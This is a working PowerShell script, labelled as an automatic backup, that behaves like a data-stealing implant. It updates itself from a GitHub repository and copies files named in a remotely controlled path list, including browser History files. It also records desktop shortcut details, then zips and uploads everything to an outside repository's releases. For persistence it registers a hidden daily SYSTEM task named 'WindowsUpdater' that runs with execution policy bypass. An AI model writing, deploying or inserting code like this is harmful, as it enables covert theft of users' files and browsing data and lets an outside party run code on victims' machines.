# === STEP 0: 安全尝试自我更新 ===
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

try {
    $scriptContent = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing -ErrorAction Stop
    if ($scriptContent -and $scriptContent.Length -gt 0) {
        $scriptContent | Out-File -FilePath $localPath -Encoding utf8
        Write-Host "✅ Local script updated from GitHub"
    } else {
        Write-Warning "⚠️ Remote script is empty. Keeping existing version."
    }
} catch {
    Write-Warning "⚠️ Failed to update local script from GitHub. Using existing version."
}

# === STEP 1: 初始化参数 ===
$token = $env:GH_UPLOAD_KEY
if (-not $token) {
    Write-Error "❌ 环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
    return
}

$repo = "drftghy/backup-files"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# === STEP 2: 拉取远程路径列表 ===
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    Write-Warning "⚠️ 无法获取远程路径列表"
    return
}

# === STEP 3: 复制路径到临时目录 ===
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) { continue }
    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {}
}

# === STEP 4: 提取桌面 .lnk 快捷方式信息 ===
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    $shell = New-Object -ComObject WScript.Shell

    foreach ($lnk in $lnkFiles) {
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
} catch {}

# === STEP 5: 压缩文件为 ZIP ===
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch {
    Write-Warning "❌ 压缩失败"
    return
}

# === STEP 6: 创建 GitHub Release 并上传 ZIP ===
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch {
    Write-Warning "❌ 创建 Release 失败"
    return
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
    Write-Host "✅ ZIP 上传成功"
} catch {
    Write-Warning "❌ ZIP 上传失败"
}

# === STEP 7: 清理临时文件 ===
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# === STEP 8: 注册计划任务（SYSTEM，每天 2:00 AM）===
$taskName = "WindowsUpdater"
$taskDescription = "Daily file package task"
$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"

try {
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 2:00am
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
    Write-Host "📅 计划任务 [$taskName] 已注册"
} catch {
    Write-Warning "⚠️ 注册计划任务失败：$($_.Exception.Message)"
}
